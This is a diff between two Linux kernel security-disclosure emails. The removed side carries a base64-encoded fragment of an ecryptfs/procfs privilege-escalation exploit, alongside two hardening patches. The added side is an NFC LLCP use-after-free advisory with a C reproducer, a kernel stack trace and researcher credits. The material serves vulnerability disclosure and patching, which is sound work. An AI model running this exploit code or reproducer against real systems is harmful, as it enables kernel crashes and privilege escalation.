-dG1wL2V4cGxvaXRfbW91bnQiLCAiMSIsIE1BVFJPU0tBX1pFUk8pOwogIHN5
-bmMoKTsKICBmb3IgKGludCBpPTE7IGk8TUFUUk9TS0FfREVQVEg7IGkrKykg
-ewogICAgY2hhciBpX3N0clsxMF07CiAgICBjaGFyIG5leHRpX3N0clsxMF07
-CiAgICBzcHJpbnRmKGlfc3RyLCAiJWQiLCBpKTsKICAgIHNwcmludGYobmV4
-dGlfc3RyLCAiJWQiLCBpKzEpOwogICAgY29weV9maWxlKCIvdG1wL2V4cGxv
-aXRfbG93ZXIiLCBpX3N0ciwgIi90bXAvZXhwbG9pdF9tb3VudCIsIG5leHRp
-X3N0cik7CiAgICBzeW5jKCk7CiAgfQoKICAvLyBjcmVhdGUgdGhyZWFkcwog
-IGZvciAoaW50IGk9MDsgaTxNQVRST1NLQV9ERVBUSDsgaSsrKSB7CiAgICBz
-eW5jX2V2ZW50ZmRzX3RvX2NoaWxkW2ldID0gZXZlbnRmZCgwLCBFRkRfU0VN
-QVBIT1JFKTsKICAgIGlmIChzeW5jX2V2ZW50ZmRzX3RvX2NoaWxkW2ldID09
-IC0xKQogICAgICBlcnIoMSwgImV2ZW50ZmQiKTsKICAgIHN5bmNfZXZlbnRm
-ZHNfZnJvbV9jaGlsZFtpXSA9IGV2ZW50ZmQoMCwgRUZEX1NFTUFQSE9SRSk7
-CiAgICBpZiAoc3luY19ldmVudGZkc19mcm9tX2NoaWxkW2ldID09IC0xKQog
-ICAgICBlcnIoMSwgImV2ZW50ZmQiKTsKICB9CiAgZm9yIChpbnQgaT0wOyBp
-PE1BVFJPU0tBX0RFUFRIOyBpKyspIHsKICAgIHBpZF90IGNoaWxkID0gZm9y
-aygpOwogICAgaWYgKGNoaWxkID09IC0xKQogICAgICBlcnIoMSwgImZvcmsi
-KTsKICAgIGlmIChjaGlsZCA9PSAwKSB7CiAgICAgIGNoYXIgZmlsZW51bXN0
-clsxMF07CiAgICAgIHNwcmludGYoZmlsZW51bXN0ciwgIiVkIiwgaSsxKTsK
-ICAgICAgY2hhciAqZGlyZWN0X21hdHJvc2thOwogICAgICBzaXplX3QgZGly
-ZWN0X21hdHJvc2thX2xlbiA9IHJlYWRfZmlsZSgiL3RtcC9leHBsb2l0X2xv
-d2VyIiwgZmlsZW51bXN0ciwgJmRpcmVjdF9tYXRyb3NrYSk7CiAgICAgIHNl
-dF9lbnZfYXJlYShkaXJlY3RfbWF0cm9za2EsIGRpcmVjdF9tYXRyb3NrYV9s
-ZW4pOwoKICAgICAgLy8gTm90ZTogVGhpcyB5aWVsZHMgY29udHJvbCB0byB0
-aGUgbWFpbiBwcm9jZXNzIGFuZCBvbmx5IHJlc3VtZXMgYWZ0ZXIgYWxsIHRo
-ZSBjaGlsZHJlbgogICAgICAvLyBoYXZlIHBhc3NlZCB0aGlzIHBvaW50IQog
-ICAgICBldmVudGZkX3NlbmQoc3luY19ldmVudGZkc19mcm9tX2NoaWxkW2ld
-KTsKICAgICAgZXZlbnRmZF93YWl0KHN5bmNfZXZlbnRmZHNfdG9fY2hpbGRb
-aV0pOwoKICAgICAgaWYgKGkgIT0gTUFUUk9TS0FfREVQVEggLSAxKSB7CiAg
-ICAgICAgLy8gbWFwIGxvd2VyIGVudmlyb24gYXMgZW52aXJvbgogICAgICAg
-IGNoYXIgbmV3X2Vudl9wYXRoWzMwMF07CiAgICAgICAgc3ByaW50ZihuZXdf
-ZW52X3BhdGgsICIvdG1wL2V4cGxvaXRfbW91bnRzLyVkL2Vudmlyb24iLCBp
-KzEpOwogICAgICAgIGNoYXIgKm5ld19lbnYgPSBtbWFwX2ZpbGUobmV3X2Vu
-dl9wYXRoLCBkaXJlY3RfbWF0cm9za2FfbGVuKTsKICAgICAgICBzZXRfZW52
-X2FyZWEobmV3X2VudiwgZGlyZWN0X21hdHJvc2thX2xlbik7CiAgICAgIH0K
-CiAgICAgIGV2ZW50ZmRfc2VuZChzeW5jX2V2ZW50ZmRzX2Zyb21fY2hpbGRb
-aV0pOwogICAgICBldmVudGZkX3dhaXQoc3luY19ldmVudGZkc190b19jaGls
-ZFtpXSk7CgogICAgICBleGl0KDApOwogICAgfQogICAgZXZlbnRmZF93YWl0
-KHN5bmNfZXZlbnRmZHNfZnJvbV9jaGlsZFtpXSk7CiAgICBjaGlsZHJlbltp
-XSA9IGNoaWxkOwogIH0KCiAgLy8gc2V0IHVwIG1vdW50cwogIGlmIChta2Rp
-cigiL3RtcC9leHBsb2l0X21vdW50cyIsIDA3MDApICYmIGVycm5vICE9IEVF
-WElTVCkKICAgIGVycigxLCAibWtkaXIgaW4gL3RtcCIpOwogIGZvciAoaW50
-IGk9MDsgaTxNQVRST1NLQV9ERVBUSDsgaSsrKSB7CiAgICBjaGFyIGV4cGxv
-aXRfbW91bnRfc3VicGF0aFszMDBdOwogICAgc3ByaW50ZihleHBsb2l0X21v
-dW50X3N1YnBhdGgsICIvdG1wL2V4cGxvaXRfbW91bnRzLyVkIiwgaSk7CiAg
-ICBpZiAobWtkaXIoZXhwbG9pdF9tb3VudF9zdWJwYXRoLCAwNzAwKSAmJiBl
-cnJubyAhPSBFRVhJU1QpCiAgICAgIGVycigxLCAibWtkaXIgaW4gL3RtcCIp
-OwoKICAgIC8vIG5vdGU6IHRoZSB1bW91bnQgaGVscGVyIHJlbW92ZWQgdGhl
-IGtleSwgcmVpbnNlcnQgaXQKICAgIGlmIChlY3J5cHRmc19hZGRfcGFzc3Bo
-cmFzZV9rZXlfdG9fa2V5cmluZyhzaWcsICJmb29iYXIiLCBzYWx0KSA8IDAp
-CiAgICAgIGVycngoMSwgInVuYWJsZSB0byBhZGQga2V5IHRvIGtleXJpbmci
-KTsKICAgIHNwcmludGYoY29uZl9kYXRhLCAiL3Byb2MvJWQgL3RtcC9leHBs
-b2l0X21vdW50cy8lZCBlY3J5cHRmcyBub25lIDAgMFxuIiwgKGludCljaGls
-ZHJlbltpXSwgaSk7CiAgICB3cml0ZV9maWxlKGVjcnlwdGZzX2RpciwgImV4
-cGxvaXQuY29uZiIsIGNvbmZfZGF0YSk7CiAgICBpZiAoc3lzdGVtKCIvc2Jp
-bi9tb3VudC5lY3J5cHRmc19wcml2YXRlIGV4cGxvaXQiKSkKICAgICAgZXJy
-eCgxLCAic3lzdGVtIGZhaWxlZCIpOwogIH0KCiAgLy8gbWFwIGxvd2VyIGVu
-dmlyb24KICBjaGFyICp0b3BfbWFwID0gbW1hcF9maWxlKCIvdG1wL2V4cGxv
-aXRfbW91bnRzLzAvZW52aXJvbiIsIHNpemVvZihNQVRST1NLQV9aRVJPKSk7
-CiAgZm9yIChpbnQgaT0wOyBpPE1BVFJPU0tBX0RFUFRIOyBpKyspIHsKICAg
-ICAgZXZlbnRmZF9zZW5kKHN5bmNfZXZlbnRmZHNfdG9fY2hpbGRbaV0pOwog
-ICAgICBldmVudGZkX3dhaXQoc3luY19ldmVudGZkc19mcm9tX2NoaWxkW2ld
-KTsKICB9CgogIHB1dHMoImZhdWx0IGNoYWluIHNldCB1cCwgZmF1bHRpbmcg
-bm93Iik7CiAgcmV0dXJuICoodW5zaWduZWQgbG9uZyAqKSh0b3BfbWFwICsg
-c2l6ZW9mKE1BVFJPU0tBX1pFUk8pIC0gOCk7Cn0KAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
+Note that the 'local' field (of type nfc_llcp_local) is acquired from
+a global per device list, via the function nfc_llcp_find_local. So if
+we can fail the nfc_llcp_get_sdp_ssap for example, the global object
+will get its reference count increased only once (via the
+nfc_llcp_local_get function), but it will be freed twice (once in the
+failure branch in bind, and another time in the destructor of the
+socket when the last fd to it is closed).
 
---------------070000050502060506050409
-Content-Type: text/plain; charset=UTF-8;
- name="1of3.patch"
-Content-Transfer-Encoding: quoted-printable
-Content-Disposition: attachment;
- filename="1of3.patch"
+Our reproducer program looks like this:
 
-From: Jann Horn <jannh@google.com>
-To: security@kernel.org
-Cc: Jann Horn <jannh@google.com>
-Subject: [PATCH 1/3] proc: prevent stacking filesystems on top
-Date: Wed,  1 Jun 2016 11:55:05 +0200
-Message-Id: <1464774907-7753-1-git-send-email-jannh@google.com>
-X-Mailer: git-send-email 2.8.0.rc3.226.g39d4020
-In-Reply-To: <CAG48ez3HNCkbW0rFyQJqAvaLNxtLWTKMdPoo6TruYdkpE7oVvg@mail.gmai=
-l.com>
-References: <CAG48ez3HNCkbW0rFyQJqAvaLNxtLWTKMdPoo6TruYdkpE7oVvg@mail.gmail=
-.com>
-X-Spam-Status: No, hits=3D-5.1 required=3D5 tests=3DDKIM_SIGNED,DKIM_VALID,=
-DKIM_VALID_AU,DKIM_VERIFIED
-X-Spam-Checker-Version: SpamAssassin 3.4.0-outflux_revision__1.66__
-X-Virus-Scanned: ClamAV using ClamSMTP
-Envelope-To: kees@outflux.net
-X-MIMEDefang-Filter: outflux$Revision: 1.316 $
-X-HELO: www.outflux.net
-X-Scanned-By: MIMEDefang 2.73
+#include <sys/socket.h>
+#include <linux/nfc.h>
+#include <string.h>
+#include <memory.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <errno.h>
 
-This prevents stacking filesystems (ecryptfs and overlayfs)
-from using procfs as lower filesystem. There is too much magic
-going on inside procfs, and there is no good reason to stack
-stuff on top of procfs.
+int main() {
+    struct sockaddr_nfc_llcp addr = {0};
+    int sock1 = socket( AF_NFC, SOCK_STREAM, NFC_SOCKPROTO_LLCP );
+    if (sock1 < 0) {
+        perror("sock1");
+        return -1;
+    }
+    int sock2 = socket( AF_NFC, SOCK_STREAM, NFC_SOCKPROTO_LLCP );
+    if (sock2 < 0) {
+        perror("sock2");
+        return -1;
+    }
+    addr.sa_family = AF_NFC;
+    addr.nfc_protocol = NFC_PROTO_NFC_DEP;
+    bind( sock1, (struct sockaddr*) &addr, sizeof(struct sockaddr_nfc_llcp) );
+    bind( sock2, (struct sockaddr*) &addr, sizeof(struct sockaddr_nfc_llcp) );
+    close(sock1);
+    close(sock2);
+    return 0;
+}
 
-(For example, procfs does access checks in VFS open handlers,
-and ecryptfs by design calls open handlers from a kernel
-thread that doesn't drop privileges or so.)
+This is the resulting stack trace:
 
-Signed-off-by: Jann Horn <jannh@google.com>
-Cc: stable@vger.kernel.org
----
- fs/proc/root.c | 7 +++++++
- 1 file changed, 7 insertions(+)
-
-diff --git a/fs/proc/root.c b/fs/proc/root.c
-index 55bc7d6..0670278 100644
---- a/fs/proc/root.c
-+++ b/fs/proc/root.c
-@@ -121,6 +121,13 @@ static struct dentry *proc_mount(struct file_system_ty=
-pe *fs_type,
- 	if (IS_ERR(sb))
- 		return ERR_CAST(sb);
-=20
-+	/*
-+	 * procfs isn't actually a stacking filesystem; however, there is
-+	 * too much magic going on inside it to permit stacking things on
-+	 * top of it
-+	 */
-+	sb->s_stack_depth =3D FILESYSTEM_MAX_STACK_DEPTH;
-+
- 	if (!proc_parse_options(options, ns)) {
- 		deactivate_locked_super(sb);
- 		return ERR_PTR(-EINVAL);
---=20
-2.8.0.rc3.226.g39d4020
+[   36.110739] refcount_t: underflow; use-after-free.
+[   36.111163] WARNING: CPU: 12 PID: 401 at lib/refcount.c:28
+refcount_warn_saturate+0x8d/0xf0
+[   36.111864] Modules linked in:
+[   36.112142] CPU: 12 PID: 401 Comm: llcp_uaf Not tainted 5.12.0-rc8 #88
+[   36.112727] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
+BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
+[   36.113562] RIP: 0010:refcount_warn_saturate+0x8d/0xf0
+[   36.113990] Code: 05 cc cb 60 01 01 e8 a2 66 c1 ff 0f 0b c3 80 3d
+bf cb 60 01 00 75 ad 48 c7 c7 68 90 5a 82 c6 05 af cb 60 01 01 e8 83
+66 c1 ff <0f> 0b c3 80 3d a3 cb 60 01 00 75 8e 48 c7 c7 10 90 5a 82 c6
+05 93
+[   36.115524] RSP: 0018:ffffc900005e7e18 EFLAGS: 00010286
+[   36.115959] RAX: 0000000000000000 RBX: ffff88810177fc00 RCX: 0000000000000000
+[   36.116562] RDX: ffff88842fd273e0 RSI: ffff88842fd17590 RDI: ffff88842fd17590
+[   36.117167] RBP: ffff8881068f8800 R08: 0000000000000003 R09: 0000000000000001
+[   36.117756] R10: 0000000000000000 R11: ffffc900005e7c28 R12: ffff8881068f8a28
+[   36.118353] R13: ffff888100440f00 R14: ffff88810177fc00 R15: ffff8881048b3d00
+[   36.118943] FS:  00007fa68e298440(0000) GS:ffff88842fd00000(0000)
+knlGS:0000000000000000
+[   36.119624] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   36.120115] CR2: 00007fa68dd22d30 CR3: 0000000107956001 CR4: 00000000003706e0
+[   36.120713] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[   36.121314] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+[   36.121898] Call Trace:
+[   36.122127]  nfc_llcp_local_put+0x7d/0x90
+[   36.122470]  llcp_sock_destruct+0x20/0x60
+[   36.122809]  __sk_destruct+0x1f/0x170
+[   36.123139]  llcp_sock_release+0xfe/0x1c0
+[   36.123477]  __sock_release+0x38/0xb0
+[   36.123785]  sock_close+0xc/0x10
+[   36.124058]  __fput+0x85/0x220
+[   36.124335]  task_work_run+0x5e/0xa0
+[   36.124645]  exit_to_user_mode_prepare+0x11c/0x120
+[   36.125080]  syscall_exit_to_user_mode+0x20/0x40
+[   36.125506]  entry_SYSCALL_64_after_hwframe+0x44/0xae
+[   36.125967] RIP: 0033:0x7fa68ddb7f30
+[   36.126278] Code: 00 64 c7 00 0d 00 00 00 b8 ff ff ff ff eb 90 b8
+ff ff ff ff eb 89 0f 1f 40 00 83 3d d9 27 2c 00 00 75 10 b8 03 00 00
+00 0f 05 <48> 3d 01 f0 ff ff 73 31 c3 48 83 ec 08 e8 be 95 01 00 48 89
+04 24
+[   36.127813] RSP: 002b:00007ffde905d1c8 EFLAGS: 00000246 ORIG_RAX:
+0000000000000003
+[   36.128450] RAX: 0000000000000000 RBX: 0000000000000000 RCX: 00007fa68ddb7f30
+[   36.129038] RDX: 00007fa68e076380 RSI: 00007fa68e075b58 RDI: 0000000000000004
+[   36.129631] RBP: 00007ffde905d250 R08: 00007fa68e298440 R09: 000000000000001d
+[   36.130291] R10: 0000000000000692 R11: 0000000000000246 R12: 00000000004005c0
+[   36.130909] R13: 00007ffde905d330 R14: 0000000000000000 R15: 0000000000000000
+[   36.131507] ---[ end trace 77d2f4e506e4292c ]---
+[   39.837966] systemd-journald[197]: Successfully sent stream file
+descriptor to service manager.
 
 
+Note that the two sockets will get the same 'local' object (as they
+are related to the same device). So the reference count of local will
+start with 1 (once it is in the global list), increased and
+immediately decreased by 1 (due to the bind of sock1), increased and
+immediately decreased by 1 again (due to the bind of sock2).
+Afterwards, it will be reduced to 0 (and therefore the object will be
+freed) when sock1 is closed, and the final close (of sock2) will
+attempt to decrease the reference of a dangling pointer, leading to
+UAF.
 
---------------070000050502060506050409
-Content-Type: text/x-patch;
- name="3of3.patch"
-Content-Transfer-Encoding: quoted-printable
-Content-Disposition: attachment;
- filename="3of3.patch"
+Note that a similar flow exists in the llcp_sock_connect function,
+where the original patch submitter attempted to fix the issue in the
+same manner, leading to the same vulnerability.
 
-From: Jann Horn <jannh@google.com>
-To: security@kernel.org
-Cc: Jann Horn <jannh@google.com>
-Subject: [PATCH 3/3] sched: panic on corrupted stack end
-Date: Wed,  1 Jun 2016 11:55:07 +0200
-Message-Id: <1464774907-7753-3-git-send-email-jannh@google.com>
-X-Mailer: git-send-email 2.8.0.rc3.226.g39d4020
-In-Reply-To: <1464774907-7753-1-git-send-email-jannh@google.com>
-References: <CAG48ez3HNCkbW0rFyQJqAvaLNxtLWTKMdPoo6TruYdkpE7oVvg@mail.gmail=
-.com>
- <1464774907-7753-1-git-send-email-jannh@google.com>
-X-Spam-Status: No, hits=3D-5.1 required=3D5 tests=3DDKIM_SIGNED,DKIM_VALID,=
-DKIM_VALID_AU,DKIM_VERIFIED
-X-Spam-Checker-Version: SpamAssassin 3.4.0-outflux_revision__1.66__
-X-Virus-Scanned: ClamAV using ClamSMTP
-Envelope-To: kees@outflux.net
-X-MIMEDefang-Filter: outflux$Revision: 1.316 $
-X-HELO: www.outflux.net
-X-Scanned-By: MIMEDefang 2.73
+=*=*=*=*=*=*=*=*=CREDIT=*=*=*=*=*=*=*=*=
 
-Until now, hitting this BUG_ON caused a recursive oops (because oops
-handling involves do_exit(), which calls into the scheduler, which in
-turn raises an oops), which caused stuff below the stack to be
-overwritten until a panic happened (e.g. via an oops in interrupt context,
-caused by the overwritten CPU index in the thread_info).
-
-Just panic directly.
-
-Signed-off-by: Jann Horn <jannh@google.com>
----
- kernel/sched/core.c | 3 ++-
- 1 file changed, 2 insertions(+), 1 deletion(-)
-
-diff --git a/kernel/sched/core.c b/kernel/sched/core.c
-index 7f2cae4..8dbe9be 100644
---- a/kernel/sched/core.c
-+++ b/kernel/sched/core.c
-@@ -3156,7 +3156,8 @@ static noinline void __schedule_bug(struct task_struc=
-t *prev)
- static inline void schedule_debug(struct task_struct *prev)
- {
- #ifdef CONFIG_SCHED_STACK_END_CHECK
--	BUG_ON(task_stack_end_corrupted(prev));
-+	if (task_stack_end_corrupted(prev))
-+		panic("corrupted stack end detected inside scheduler\n");
- #endif
-=20
- 	if (unlikely(in_atomic_preempt_off())) {
---=20
-2.8.0.rc3.226.g39d4020
-
-
---------------070000050502060506050409--
-
---KurOk4gPSfS3NShJjJTnc2c6wP2p5h2uJ--
-
---oUFadpsSXmWEIrH4XXSl7BcG1sRDfWP35
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: OpenPGP digital signature
-Content-Disposition: attachment; filename="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v2
-
-iQIcBAEBCgAGBQJXWzUvAAoJEAUvNnAY1cPY4HAP/13q9WtZN8s3xJ61OcW6ftmg
-mJ4rI8fvF3KvF/n/TR13NDWCrppqKJqlYdtDgtTFBMyPixAyCdAls1uTyWvJtBAw
-hgCqNxiC3GYkIW9LTetZhp3NBwUnX04rFtwR7E999j8lmWU8p4eoud2llQSoPht4
-KOeWyjpFKD7TH/Uj87fvcNQ5rwlOoDt4bAz/jvTl6tfsDa8eO0zgv0WGnmWq7MGH
-hixCrrmEaMKjVJeLONDaYUXlO4kDisCk5sqLhNZMzzMq5rciQ3Z+bH7pm3edz5BZ
-RmJ7VS7czA2nV4p1LqGjruM7UkwbxeUZIOVWGHa9jtEw+zIvVYAl31g5k1dr0RL6
-9H8JsP5b9DixTzobhdE3haRXctIaWGVo+/IbZW/PtBkrdHDqvuj8ZzbhM+sca1OO
-MKABcXzjcpHj20syDEUqpxOojwYe7YBnLE6KDK3nQGpLWVgXIQR11nH8Ug9JeqpC
-oHdV2bcU43tQj3agZdOdx9MUA0HKILPEWfuvcgGezbGNZvxyK0U0SPExi1Jh/ul+
-w8uz1YP7dZ0FuLEpakGnuzobHpibr/i747v7R/BO9O7qpm5ym2AsewpYzIBZiAT9
-AhIYg6sITSyeK0e80LP+5relQr9WG+tfZQWyLz9gtvtIwfz5eFceq64ktDPloNLU
-Op6/n5f96mbw7RNa2SV9
-=50sO
------END PGP SIGNATURE-----
-
---oUFadpsSXmWEIrH4XXSl7BcG1sRDfWP35--
+Or Cohen
+Nadav Markus
+Palo Alto Networks
